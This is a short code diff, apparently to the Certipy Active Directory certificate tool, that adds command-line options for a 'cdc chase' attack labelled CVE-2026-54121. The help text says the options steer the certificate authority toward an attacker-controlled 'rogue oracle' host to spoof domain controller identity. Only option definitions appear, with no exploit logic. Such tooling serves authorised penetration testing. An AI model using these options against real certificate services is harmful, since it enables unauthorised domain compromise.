@@ -163,6 +163,38 @@ def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable
         help="Specify SMIME Extension that gets added to CSR (e.g., des, rc4, 3des, aes128, aes192, aes256)",
     )
 
+    # CVE-2026-54121 (Certighost) "cdc chase" request attributes
+    chase_group = subparser.add_argument_group("cdc-chase options (CVE-2026-54121)")
+    chase_group.add_argument(
+        "-cdc",
+        action="store",
+        metavar="attacker host",
+        help=(
+            "Client-DC (cdc) enrollment attribute: the host the CA is told to "
+            "chase for DC identity data. Point it at a rogue oracle (see "
+            "'certipy chase')"
+        ),
+    )
+    chase_group.add_argument(
+        "-rmd",
+        action="store",
+        metavar="target dc dns",
+        help=(
+            "Remote-domain (rmd) enrollment attribute: the DC principal the CA "
+            "looks up on the cdc host"
+        ),
+    )
+    chase_group.add_argument(
+        "-request-attribute",
+        action="append",
+        metavar="key:value",
+        help=(
+            "Additional raw request attribute (repeatable), appended verbatim, "
+            "e.g. -request-attribute cdc:1.2.3.4 -request-attribute "
+            "rmd:dc01.corp.local"
+        ),
+    )
+
     # Output options
     output_group = subparser.add_argument_group("output options")
     output_group.add_argument(
